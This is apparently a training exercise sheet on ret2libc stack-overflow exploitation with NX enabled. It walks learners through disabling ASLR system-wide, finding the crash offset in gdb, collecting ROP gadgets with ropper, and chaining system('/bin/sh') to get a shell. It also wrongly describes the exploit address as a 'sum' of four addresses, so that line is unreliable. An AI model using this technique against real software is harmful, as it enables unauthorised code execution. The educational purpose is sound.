We will start practicing stack overflows when different security measures are activated. Enabling them one-by-one, increasing the difficulty gradually.

## Exercise 1 - NX Enabled

- Disable the OS-level ASLR protection by running `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
- Get the exercise binary by running `wget https://gr4n173.github.io/ret2libc/public/files/climb`
- Enter in a `gdb` session for the binary, run the `checksec` command to check the security measures, answer the following:
  - Is the stack executable? 
  - Which binary segments are randomized? 
  - Are canaries present?
  - Can you write the `GOT` and `PLT` sections?
- Generate a pattern of 300 bytes with `pattern create 300`, we will use this string to overwrite the `RBP` register, as we said in the theory section.
  - Find the vulnerable function, set a breakpoint to it, then continue execution. 
  - Paste the pattern string on the standard input, observe that a crash happens.
  - Inspect the `RBP` register after the crash, get it's value with `pattern offset [rbp_value]` then add 8 bytes to it, the number that you get is the "offset".
  - Begin to write your exploit string like this: `'A'*[offset] + [exploit_address]`, we will use this string as input for the binary later.
  - The `exploit_address` will be equal to the sum of 4 different addresses we need to get: `RET + POP_RDI + BIN_SH + SYSTEM`
    - To get `RET`, execute in a separate terminal: `ropper -f [vulnerable_binary] --search "ret;"`
    - To get `POP_RDI`, execute in a separate terminal: `ropper -f [vulnerable_binary] --search "pop rdi; ret"`
    - To get `SYSTEM` and `BIN_SH`, execute the following while in a new `gdb [vulnerable_binary]` session:
      - `b main`
      - `r`
      - `p system`
      - `find [SYSTEM_ADDRESS_HERE],+99999999,"/bin/sh"`
    - Append the addresses you found to the original exploit string in the correct order.
    - Make the binary execute a shell by providing the exploit string as input, achieving code execution.
